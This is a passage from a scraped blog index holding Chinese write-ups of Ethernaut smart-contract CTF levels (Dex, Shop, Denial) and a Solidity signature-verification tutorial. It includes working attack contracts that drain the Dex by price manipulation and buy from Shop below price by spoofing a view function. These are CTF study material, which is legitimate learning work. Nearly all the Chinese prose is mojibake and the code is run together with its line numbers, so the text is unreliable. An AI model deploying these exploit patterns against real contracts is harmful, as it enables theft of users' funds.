token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125;&#125;contract SwappableToken is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125;&#125; 2. åˆ†ætipsï¼š å‚è€ƒåšå®¢ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼šè¿™æ˜¯ä¸€ä¸ªç®€å•çš„ERC20ä»¤ç‰Œï¼Œå®ƒå‘é“¸é€ ä¸€ä¸ªinitialSupplyï¼ˆæŒ‡å®šä¸º çš„è¾“å…¥ï¼‰å¹¶è¦†ç›–äº†å‡½æ•°ä»¥é˜²æ­¢åœ°å€èƒ½å¤Ÿæ‰¹å‡†ä»»ä½•ä»¤ç‰Œã€‚ 2.2 åˆ†æ Dex.sol åˆçº¦å¯çŸ¥ï¼Œå®ƒå…è®¸ownerDex æä¾›ä¸€å¯¹ä»£å¸çš„æµåŠ¨æ€§token1ï¼Œå¹¶ä¸”token2åœ¨æœ€ç»ˆç”¨æˆ·äº¤æ¢è¿™äº›ä»£å¸æ—¶ä¸æ”¶å–ä»»ä½•è´¹ç”¨ã€‚æœ€ç»ˆç”¨æˆ·å°†ä½¿ç”¨ Dex æ¥swapï¼ˆå‡ºå”®ï¼‰ç‰¹å®šæ•°é‡çš„ä¸€ç§ä»£å¸ï¼Œä»¥å–å›swapAmountï¼ˆå–å†³äº Dex çš„ä»£å¸ä»·æ ¼ï¼‰å¦ä¸€ç§ä»£å¸ã€‚ function setTokens(address _token1, address _token2) public onlyOwner1234function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2;&#125; è¯¥åŠŸèƒ½å…è®¸Dexå¹³å°çš„æ‰€æœ‰è€…è®¾ç½®token1å’Œçš„åœ°å€token2ã€‚è¯¥å‡½æ•°æ­£ç¡®æ£€æŸ¥åªæœ‰ownerDex çš„ æ‰èƒ½è°ƒç”¨æ­¤å‡½æ•°ã€‚ownerå½“å·²ç»æä¾›è¿™äº›ä»£å¸çš„ä¾›åº”æ—¶ï¼Œé˜²æ­¢æ›´æ”¹è¿™äº›åœ°å€ä¹Ÿæ˜¯æœ‰æ„ä¹‰çš„ï¼ˆå¦åˆ™æ—§ä»£å¸å°†æ°¸è¿œå¡åœ¨åˆçº¦ä¸­ï¼‰ã€‚ function approve(address spender, uint256 amount) public1234function approve(address spender, uint256 amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount);&#125; è¿™æ˜¯ä¸€ä¸ªæ›´å®ç”¨çš„åŠŸèƒ½ï¼Œå…è®¸æœ€ç»ˆç”¨æˆ·æ‰¹å‡†spenderç®¡ç†amountä¸¤ä¸ªä»¤ç‰Œä¸­çš„ä¸€ä¸ªã€‚è¿™é‡Œæ²¡æœ‰ä»€ä¹ˆå¥‡æ€ªçš„ã€‚æ‚¨å¯ä»¥é€šè¿‡ç›´æ¥è°ƒç”¨ä¼ é€’ç›¸åŒå‚æ•°çš„token1å’Œå‡½æ•°æ¥å®ç°ç›¸åŒçš„ç»“æœï¼Œæ­£å¦‚æˆ‘æ‰€è¯´çš„ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªå®ç”¨å‡½æ•°ï¼Œå¯ä»¥è®©æœ€ç»ˆç”¨æˆ·çš„ç”Ÿæ´»æ›´è½»æ¾ã€‚token2 approve function balanceOf(address token, address account) public view returns (uint256)123function balanceOf(address token, address account) public view returns (uint256) &#123; return IERC20(token).balanceOf(account);&#125; è·å–ç‰¹å®šä»£å¸åœ°å€çš„ç”¨æˆ·ä½™é¢çš„ç®€å•å®ç”¨å‡½æ•°ã€‚ function swap(address from, address to, uint256 amount) public123456789101112function swap( address from, address to, uint256 amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount);&#125; è¿™æ˜¯è´Ÿè´£å°†ä¸€ä¸ªä»£å¸ä¸å¦ä¸€ä¸ªä»£å¸äº¤æ¢ï¼ˆå‡ºå”®&#x2F;è´­ä¹°ï¼‰çš„åŠŸèƒ½ã€‚æ‚¨çœ‹åˆ°çš„ç¬¬ä¸€ä¸ªrequireï¼Œæ£€æŸ¥æ‚¨æ˜¯å¦åªèƒ½äº¤æ¢token1ï¼Œtoken2åä¹‹äº¦ç„¶ã€‚ ä¹‹åï¼ŒDex è®¡ç®—æ‰æœŸä»·æ ¼ã€‚å¯¹äºç»™å®šamountçš„ä¸€ä¸ªä»¤ç‰Œï¼Œç”¨æˆ·å–å›äº†å¤šå°‘å…¶ä»–ä»¤ç‰Œï¼Ÿ ç„¶åå®ƒæ‰§è¡Œæ‰€æœ‰éœ€è¦çš„ä¼ è¾“ amountå°†å‡ºå”®çš„ä»£å¸ä»ç”¨æˆ·è½¬ç§»åˆ° Dex åˆçº¦ æ‰¹å‡†Dexç®¡ç†swapAmountç”¨æˆ·è´­ä¹°çš„ä»£å¸ swapAmountä» Dex å‘ç”¨æˆ·è½¬ç§»é‡‘é¢ å½“ä¸”ä»…å½“ä¸¤è€…token1éƒ½æ˜¯ä»£å¸æ ‡å‡†token2çš„è‰¯å¥½å®æ–½æ—¶ï¼Œæ‰ä¸éœ€è¦å¯¹è¿™äº›é‡‘é¢è¿›è¡Œæ£€æŸ¥ERC20ã€‚å½“å‰çš„ Dex æ­£åœ¨ä½¿ç”¨ OpenZeppelin ERC20 å®ç°çš„ä¸¤ç§ä»£å¸ï¼Œå› æ­¤å¦‚æœ Dex æˆ–ç”¨æˆ·çš„ä½™é¢ä¸­æ²¡æœ‰è¶³å¤Ÿæ•°é‡çš„ä»£å¸æ¥æ‰§è¡Œè½¬è´¦ï¼Œäº¤æ˜“å°†è‡ªåŠ¨æ¢å¤ function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256)è¿™æ˜¯æ•´ä¸ªåˆçº¦ä¸­æœ€æ ¸å¿ƒä¹Ÿæ˜¯æœ€é‡è¦çš„åŠŸèƒ½ã€‚æ­¤åŠŸèƒ½è´Ÿè´£è®¡ç®—æ‰æœŸä»·æ ¼ã€‚æ‰§è¡Œ çš„tokenXäº¤æ¢æ“ä½œæ—¶ï¼Œç”¨æˆ·è·å¾—å¤šå°‘ä»¤ç‰Œï¼ŸtokenY Dex å†…éƒ¨çš„å½“å‰å®ç°æ˜¯ä½¿ç”¨ä»£å¸ä½™é¢æ¥è®¡ç®—ä»·æ ¼ï¼Œå¹¶å› æ­¤è®¡ç®—ç”¨æˆ·å°†æ”¶åˆ°çš„ä»£å¸æ•°é‡ã€‚ ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸ªé—®é¢˜ï¼Ÿä½¿ç”¨ä½™é¢ä½œä¸ºè®¡ç®—ä»·æ ¼çš„ä¸€ä¸ªå› ç´ å°†ä½¿æ‚¨çš„åˆçº¦çƒ­è¡·äºç§°ä¸ºâ€œä»·æ ¼æ“çºµâ€çš„æ”»å‡»ï¼Œä¸å¹¸çš„æ˜¯ï¼ˆä½†ä¸ä»…ä¸è¿™ä¸ªç®€å•çš„ä½™é¢æ¡ˆä¾‹æœ‰å…³ï¼‰å®ƒå¹¶ä¸å°‘è§ã€‚ ç”¨äºè®¡ç®—ç”¨æˆ·å› äº¤æ¢æ“ä½œè€Œæ”¶åˆ°çš„ä»£å¸æ•°é‡çš„å…¬å¼å¦‚ä¸‹((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))) è¿™ä¸ªå…¬å¼å‘Šè¯‰ä½ å½“ä½ å‘é€ä»£å¸toæ—¶ä½ ä¼šå¾—åˆ°å¤šå°‘ä»£å¸ã€‚è¾ƒä½çš„æ˜¯ï¼ˆä¸ çš„ä½™é¢ç›¸æ¯”ï¼‰çš„ä½™é¢ï¼Œè¾ƒé«˜çš„æ˜¯ çš„é‡‘é¢ã€‚amount``from``from``to``to è¯¥ Dex ä¸ä½¿ç”¨å¤–éƒ¨Oracleï¼ˆå¦‚Chainlinkï¼‰æˆ–Uniswap TWAPï¼ˆæ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼‰æ¥è®¡ç®—æ‰æœŸä»·æ ¼ã€‚ç›¸åï¼Œå®ƒä½¿ç”¨ä»¤ç‰Œçš„ä½™é¢æ¥è®¡ç®—å®ƒï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒã€‚ åœ¨ Solidity ä¸­ï¼Œæœ‰ä¸€ä¸ªç§°ä¸ºâ€œèˆå…¥è¯¯å·®â€çš„å·²çŸ¥é—®é¢˜ã€‚è¿™ä¸ªé—®é¢˜æ˜¯ç”±æ‰€æœ‰æ•´æ•°é™¤æ³•å‘ä¸‹èˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°è¿™ä¸€äº‹å®å¼•èµ·çš„ã€‚è¿™æ„å‘³ç€å¦‚æœä½ æ‰§è¡Œ5/2ç»“æœå°†ä¸æ˜¯2.5but 2ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘ä»¬å–æ‰ 1ï¼Œtoken1ä½†token2*amount &lt; token1æˆ‘ä»¬ä¼šæ‹¿å›0 token2ï¼åŸºæœ¬ä¸Šæˆ‘ä»¬ä¼šå‡ºå”®ä»£å¸ä»¥è·å¾—é›¶å›æŠ¥ï¼ 2.3 å‚è€ƒè§†é¢‘ ç¼–å†™æ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435contract Hack &#123; IDex private immutable dex; IERC20 private immutable token1; IERC20 private immutable token2; constructor (IDex _dex) &#123; dex = _dex; token1 = IERC20(dex.token1); token2 = IERC20(dex.token2); &#125; function pwn() external &#123; token1.transferFrom(msg.sender, address(this), 10); token2.transferFrom(msg.sender, address(this), 10); token1.approve(address(dex), type(uint).max); token2.approve(address(dex), type(uint).max); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); dex.swap(address(token2), address(token1), 45); require(token1.balanceOf(address(dex)) == 0, &quot;dex.balance != 0&quot;); &#125; function _swap(IERC20 tokenIn, IERC20 tokenOut) private &#123; dex.swap( address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this))) &#125;&#125; 3. è§£é¢˜ï¼ˆèµ„é‡‘ä¸è¶³ï¼‰","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Shop","slug":"CTFS/ethernaut/Shop","date":"2023-03-08T04:47:10.000Z","updated":"2023-03-08T04:47:10.000Z","comments":true,"path":"2023/03/08/CTFS/ethernaut/Shop/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/08/CTFS/ethernaut/Shop/","excerpt":"","text":"Shop1. é¢˜ç›®è¦æ±‚ 1.1 æ‚¨èƒ½åœ¨å•†åº—ä»¥ä½äºè¦æ±‚çš„ä»·æ ¼è´­ä¹°åˆ°å•†å“å—ï¼Ÿ å¯èƒ½æœ‰å¸®åŠ©çš„æ³¨æ„ç‚¹ï¼š shopåˆçº¦é¢„è®¡ç”±ä¹°å®¶ä½¿ç”¨ äº†è§£viewå‡½æ•°çš„é™åˆ¶ 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Buyer &#123; function price() external view returns (uint);&#125;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price(); &#125; &#125;&#125; 2. åˆ†ætipsï¼šå‚è€ƒåšå®¢ 2.1 è§‚å¯Ÿä»£ç å¯çŸ¥ ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªpriceå†…éƒ¨åˆåŒï¼Œä»£è¡¨è´­ä¹°è¯¥ç‰©å“å¿…é¡»æ”¯ä»˜weiçš„é‡‘é¢ã€‚Buyer ä¹Ÿå¯ä»¥ä»…åœ¨å°šæœªå”®å‡ºçš„æƒ…å†µä¸‹è´­ä¹°è¯¥å•†å“ã€‚è¯¥å±æ€§ç”±å‡½æ•°ä¸­isSoldåˆå§‹åŒ–ä¸ºfalseç„¶åæ›´æ”¹ä¸ºçš„çŠ¶æ€å˜é‡å¤„ç†ã€‚ 2.2 è¯¦ç»†æŸ¥çœ‹ buy() å‡½æ•°ï¼Œ è¿™æ˜¯åˆçº¦çš„ä¸»è¦åŠŸèƒ½ã€‚å®ƒæŠ•å°„åˆ°msg.senderå¹¶Buyeré€šè¿‡è¿™æ ·åšå®ƒæœŸæœ›äº¤æ˜“çš„å‘é€è€…æ˜¯ä¸€ä¸ªå®ç°æ¥å£ä¸­å®šä¹‰çš„åŠŸèƒ½çš„åˆçº¦ã€‚&#96;&#96; å³ä½¿åœ¨æŒ‘æˆ˜æè¿°ä¸­æ²¡æœ‰æ˜ç¡®è¯´æ˜ï¼Œä¹Ÿåº”è¯¥è¿”å›ä¹°å®¶æ„¿æ„ä¸ºè´­ä¹°å•†åº—å•†å“æ”¯ä»˜çš„function price() external view returns (uint256);ä»·æ ¼ã€‚ åˆåŒæ£€æŸ¥ä¹°æ–¹çš„ä»·æ ¼ï¼ˆä¹°æ–¹æ„¿æ„æ”¯ä»˜çš„ä»·æ ¼ï¼‰æ˜¯å¦å¤§äºå•†åº—çš„ä»·æ ¼ï¼Œå¹¶æ£€æŸ¥è¯¥å•†å“æ˜¯å¦å°šæœªå”®å‡ºã€‚å¦‚æœè¿™ä¸ªè¦æ±‚é€šè¿‡ï¼Œå®ƒä¼šæ›´æ–°isSoldåˆ°trueå¹¶å°†priceçš„å€¼æ›´æ–°ä¸º_buyer.price();ç†è®ºä¸Šåº”è¯¥ä¸ä¹‹å‰ä¸€æ¡æŒ‡ä»¤è¿”å›çš„å€¼ç›¸åŒã€‚ 2.3 è¿™é‡Œçš„å…³é”®æ¦‚å¿µæ˜¯ï¼šä½ æ°¸è¿œä¸åº”è¯¥ ç›²ç›®åœ°ç›¸ä¿¡ä½ æœŸæœ›å¤–éƒ¨å‚ä¸è€…ä¼šåšä»€ä¹ˆï¼Œå³ä½¿ä½ å®šä¹‰äº†ä¸€ä¸ªå…·æœ‰å¤–éƒ¨å‚ä¸è€…åº”è¯¥ä¿¡ä»»çš„é€»è¾‘çš„ç‰¹å®šæ¥å£ã€‚ æ°¸è¿œä¸è¦ç›²ç›®ç›¸ä¿¡ä¸åœ¨ä½ æ§åˆ¶ä¹‹ä¸‹çš„äº‹æƒ…ã€‚ å› ä¸ºæˆ‘ä»¬æ˜¯ä¹°å®¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç®€å•çš„å®ç°priceè¿™æ ·çš„åŠŸèƒ½ 123function price() external view returns (uint256) &#123; return victim.isSold() ? 1 : 1000;&#125; å› ä¸ºpriceæ˜¯ä¸€ä¸ªviewå‡½æ•°ï¼Œæˆ‘ä»¬ä¸èƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çŠ¶æ€å˜é‡æ¥æ”¹å˜uint256å‡½æ•°è¿”å›çš„å€¼ï¼Œä½†æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ ‡è®°ä¸ºviewæˆ– çš„å¤–éƒ¨è°ƒç”¨å‡½æ•°pureã€‚ 2.4 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ 1234567891011121314151617181920contract Hack &#123; Shop private immutable target; constructor (address _target) &#123; target = Shop(_target); &#125; function pwn() external &#123; target.buy(); require(target.price() == 99, &quot;price != 99&quot;); &#125; function price() external view returns (uint) &#123; if (target.isSold()) &#123; return 99; &#125; return 100; &#125;&#125; 3. è§£é¢˜ï¼ˆæš‚æ—¶æ²¡æœ‰ä»¥å¤ªäº†ï¼Œåˆ°æ—¶å€™æœ‰é’±äº†å†æ¥åšï¼Œç”Ÿæˆå®ä¾‹å°±éœ€è¦ 0.3etherï¼‰","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"äº†è§£ç­¾åè®¤è¯","slug":"Basic_Knowledge/solidity/äº†è§£ç­¾åè®¤è¯","date":"2023-01-22T08:47:10.000Z","updated":"2023-01-22T08:47:10.000Z","comments":true,"path":"2023/01/22/Basic_Knowledge/solidity/äº†è§£ç­¾åè®¤è¯/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/22/Basic_Knowledge/solidity/%E4%BA%86%E8%A7%A3%E7%AD%BE%E5%90%8D%E8%AE%A4%E8%AF%81/","excerpt":"","text":"éªŒè¯ç­¾å1. ç­¾åä»£ç ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// SPDX-License-Identifier: MITpragma solidity ^0.8.4; /* 1. message to sign 2. hash(message) 3. sign(hash(message), private key) | offchain 4. ecrecover(hash(message), signature) == signer */contract VerifySig &#123; // verify éªŒè¯ç­¾åå‡½æ•° function verify(address _signer, string memory _message, bytes memory _sig) external pure returns(bool) &#123; bytes32 messageHash = getMessageHash(_message); // å¯¹è¾“å…¥çš„æ¶ˆæ¯è¿›è¡Œ hashè¿ç®— bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash); // å¯¹è¾“å…¥æ¶ˆæ¯è¿›è¡ŒäºŒæ¬¡hash return recover(ethSignedMessageHash, _sig) == _signer; // åˆ¤æ–­å…¬é’¥çš„åœ°å€æ˜¯å¦ä¸_signer ç›¸ç­‰? &#125; function getMessageHash(string memory _message) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked(_message)); // å¯¹æ¶ˆæ¯è¿›è¡Œhashè¿ç®— &#125; function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; //åœ¨æ¶ˆæ¯ä¸­åŠ å…¥ &quot;\\x19Ethereum Signed Message:\\n32&quot; å­—ç¬¦ä¸²,å°†è¯¥å­—ç¬¦ä¸²å’Œ _messageHash æ‰“åŒ…å¹¶è¿›è¡Œhashè¿ç®— return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); &#125; function recover(bytes32 _ethSignedMessageHash, bytes memory _sig) public pure returns(address) &#123; (bytes32 r, bytes32 s, uint8 v) = _split(_sig); // å°†_sig åˆ†å‰²ä¸º r, s, vä¸‰ä¸ªéƒ¨åˆ† return ecrecover(_ethSignedMessageHash, v, r, s); &#125; function _split(bytes memory _sig) internal pure returns(bytes32 r, bytes32 s, uint8 v) &#123; require(_sig.length == 65, &quot;invalud signature length&quot;); assembly &#123; // add(_sig, 32) æŒ‡è·³è¿‡32ä½é•¿åº¦, å»è·å–_sig ä¸­çš„ä¸€ä¸ª32ä½æ•°æ® r := mload(add(_sig, 32)) // add(_sig, 64) æŒ‡è·³è¿‡64ä½é•¿åº¦, å»è·å–_sig ä¸­çš„ä¸€ä¸ª32ä½æ•°æ® s := mload(add(_sig, 64)) // add(_sig, 96) æŒ‡è·³è¿‡96ä½é•¿åº¦, å»è·å–_sig ä¸­çš„ä¸€ä¸ª32ä½æ•°æ® // byte(0, mload(add(_sig, 96))) è¿”å›32ä½ä¸­çš„ç¬¬ä¸€ä¸ªå€¼ v := byte(0, mload(add(_sig, 96))) &#125; &#125;&#125; 2. å¿ƒå¾—å‚æ‚Ÿï¼š2.1 ecrecover()å‡½æ•°ï¼Œä½œç”¨ï¼šåœ¨solidityä¸­æ˜¯ï¼Œå°†ç­¾åçš„å…¬é’¥è¿”å›ã€‚å³ï¼Œå‡å¦‚æˆ‘ä½¿ç”¨æˆ‘çš„ğŸ¦Šè´¦æˆ·ç»™æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œå¾—åˆ°ä¸€ä¸ªç­¾åï¼›åœ¨ecrecover() å‡½æ•°ä¸­ä¼ å…¥ ä»¥å¤ªåŠç­¾åæ¶ˆæ¯ï¼ˆå¯¹æ¶ˆæ¯è¿›è¡ŒäºŒæ¬¡ hashè¿ç®—çš„ç»“æœï¼‰ ï¼Œå’Œç­¾åçš„ç»„æˆéƒ¨åˆ† r , s, vï¼Œæœ€ç»ˆè¿”å›çš„ç»“æœä¸º æˆ‘ğŸ¦Šé’±åŒ…çš„è´¦æˆ·åœ°å€ï¼ˆå…¬é’¥ï¼‰ æ¦‚æ‹¬ï¼šecrecover()å‡½æ•°é€šè¿‡ä¼ å…¥çš„â€ä»¥å¤ªåŠç­¾åæ¶ˆæ¯â€ å’Œ â€œç­¾åçš„ï¼ˆr s vï¼‰ç»„æˆéƒ¨åˆ†â€ è¿”å›å…¬é’¥ï¼ˆğŸ¦Šé’±åŒ…è´¦æˆ·åœ°å€çš„å‰èº«ï¼‰2.2 è®¡ç®—ä»¥å¤ªåŠç­¾åæ¶ˆæ¯ï¼š æ¶ˆæ¯å¯ä»¥æ˜¯èƒ½è¢«æ‰§è¡Œçš„äº¤æ˜“ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä»»ä½•å½¢å¼ã€‚ä¸ºäº†é¿å…ç”¨æˆ·è¯¯ç­¾äº†æ¶æ„äº¤æ˜“ï¼ŒEIP191æå€¡åœ¨æ¶ˆæ¯å‰åŠ ä¸Š&quot;\\x19Ethereum Signed Message:\\n32&quot;å­—ç¬¦ï¼Œå¹¶å†åšä¸€æ¬¡keccak256å“ˆå¸Œï¼Œä½œä¸ºä»¥å¤ªåŠç­¾åæ¶ˆæ¯ã€‚ç»è¿‡toEthSignedMessageHash()å‡½æ•°å¤„ç†åçš„æ¶ˆæ¯ï¼Œä¸èƒ½è¢«ç”¨äºæ‰§è¡Œäº¤æ˜“:12345function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); //åœ¨æ¶ˆæ¯ä¸­åŠ å…¥ &quot;\\x19Ethereum Signed Message:\\n32&quot; å­—ç¬¦ä¸²,å°†è¯¥å­—ç¬¦ä¸²å’Œ_messageHash æ‰“åŒ…å¹¶è¿›è¡Œhashè¿ç®— &#125; 3. æ•°å­—ç­¾åçš„ç›¸å…³çŸ¥è¯†é“¾æ¥","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"éªŒè¯ç­¾å","slug":"éªŒè¯ç­¾å","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"}]},{"title":"Denial","slug":"CTFS/ethernaut/Denial","date":"2023-01-19T07:10:10.000Z","updated":"2023-01-19T07:10:10.000Z","comments":true,"path":"2023/01/19/CTFS/ethernaut/Denial/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/CTFS/ethernaut/Denial/","excerpt":"","text":"Denial1. é¢˜ç›®è¦æ±‚ 1.1 è¿™æ˜¯ä¸€ä¸ªç®€å•çš„é’±åŒ…ï¼Œä¼šéšç€æ—¶é—´çš„æ¨ç§»è€Œæµå¤±èµ„é‡‘ã€‚æ‚¨å¯ä»¥æˆä¸ºææ¬¾ä¼™ä¼´ï¼Œæ…¢æ…¢ææ¬¾ã€‚ é€šå…³æ¡ä»¶ï¼š åœ¨ownerè°ƒç”¨withdraw()æ—¶æ‹’ç»æå–èµ„é‡‘ï¼ˆåˆçº¦ä»æœ‰èµ„é‡‘ï¼Œå¹¶ä¸”äº¤æ˜“çš„gaså°‘äº1Mï¼‰ 1.2 é¢˜ç›®è¦æ±‚ 123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance / 100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call&#123;value:amountToSend&#125;(&quot;&quot;); payable(owner).transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = block.timestamp; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds receive() external payable &#123;&#125; // convenience function function contractBalance() public view returns (uint) &#123; return address(this).balance; &#125;&#125; 2. åˆ†ætipsï¼š å‚è€ƒåšå®¢ 2.1è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆï¼š è®¾ç½®åˆçº¦çš„ä½™é¢amountToSend partneré€šè¿‡ä½çº§åˆ«å°†ä½™é¢çš„ 1% è½¬ç§»åˆ°call å°†ä½™é¢çš„ 1% è½¬å…¥åˆçº¦çš„ownerviatransfer withdrawæ›´æ–°å‡½æ•°æœ€åä¸€æ¬¡æ‰§è¡Œçš„æ—¶é—´ æ›´æ–°åˆä½œä¼™ä¼´æå–çš„é‡‘é¢ æ­£å¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œè¿™ä¸ªæŒ‘æˆ˜å®Œå…¨æ˜¯å…³äºæ‹’ç»æœåŠ¡ (DOS) çš„æ¦‚å¿µï¼Œè¿™æ˜¯ä¸€ä¸ªé€šç”¨æœ¯è¯­ï¼Œç”¨äºæè¿°å¤–éƒ¨å‚ä¸è€…æ‹’ç»æœåŠ¡çš„æŸä¸ªæ–¹é¢çš„æƒ…å†µã€‚åœ¨è¿™ç§ç‰¹å®šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦å¦è®¤withdrawåˆçº¦çš„è¿‡ç¨‹ã€‚ æˆ‘ä»¬è¯¥æ€ä¹ˆåšï¼Ÿcallæˆ‘ä»¬å”¯ä¸€çš„é€‰æ‹©æ˜¯åœ¨å¤–éƒ¨å¯¹åœ°å€åšä¸€äº›åäº‹partnerã€‚è®©æˆ‘ä»¬çœ‹çœ‹åº•å±‚callåœ¨ Solidity ä¸­æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ 1(bool success, bytes memory data) = targetAddress.call&#123;value: &lt;weiSent&gt;, gas: &lt;gasForwarded&gt;&#125;(&lt;calldata&gt;); æ­£å¦‚æˆ‘æåˆ°çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå…è®¸æ‚¨åšå¾ˆå¤šäº‹æƒ…çš„ä½çº§å‡½æ•°ã€‚é€šå¸¸ï¼Œå®ƒç”¨äºï¼š valueé€šè¿‡åœ¨é€‰é¡¹ä¸­æŒ‡å®š wei çš„æ•°é‡å°† Ether å‘é€åˆ° EAO é€šè¿‡åœ¨é€‰é¡¹ä¸­æŒ‡å®š wei çš„æ•°é‡ï¼Œå°† Ether å‘é€åˆ°å·²å®ç°receiveorå‡½æ•°çš„åˆçº¦fallback``value é€šè¿‡å°†å“ªä¸ªå‡½æ•°å’Œå“ªäº›å‚æ•°ä¼ é€’ç»™ç›®æ ‡å‡½æ•°æ¥è°ƒç”¨åˆçº¦å‡½æ•°&lt;calldata&gt;ã€‚ä¾‹å¦‚ï¼Œabi.encodeWithSignature(&quot;callMePlease()&quot;) è™½ç„¶è¿™ä¸¤ä¸ªtransferé«˜çº§sendå‡½æ•°ï¼ˆç”¨äºå°† ETH å‘é€åˆ°ç›®æ ‡åœ°å€ï¼‰éƒ½ä½¿ç”¨2300 gasçš„ç¡¬ç¼–ç é‡æ¥æ‰§è¡Œæ“ä½œï¼Œä½†è¯¥callå‡½æ•°æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼š é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ‚¨ä¸æŒ‡å®šä»»ä½•å†…å®¹ï¼Œå®ƒå°†è½¬å‘æ‰€æœ‰å‰©ä½™çš„äº¤æ˜“æ°”ä½“ gaså¦åˆ™ï¼Œæ‚¨å¯ä»¥æŒ‡å®šå¤–éƒ¨åˆçº¦å¯ä»¥ä½¿ç”¨å‚æ•°çš„æ°”ä½“é‡ è¯¥callå‡½æ•°å°†è¿”å›ä¸¤ä¸ªå‚æ•°ï¼š bool successå¦‚æœè°ƒç”¨æˆåŠŸ bytes memory dataè¿”å›å€¼ æ¯æ¬¡ä½ æ‰§è¡Œä¸€ä¸ªcallä½ åº”è¯¥æ€»æ˜¯æ£€æŸ¥å®ƒæ˜¯å¦å·²ç»æˆåŠŸå¹¶æ¢å¤ï¼ˆæˆ–å¤„ç†å®ƒä½†æ˜¯ä½ 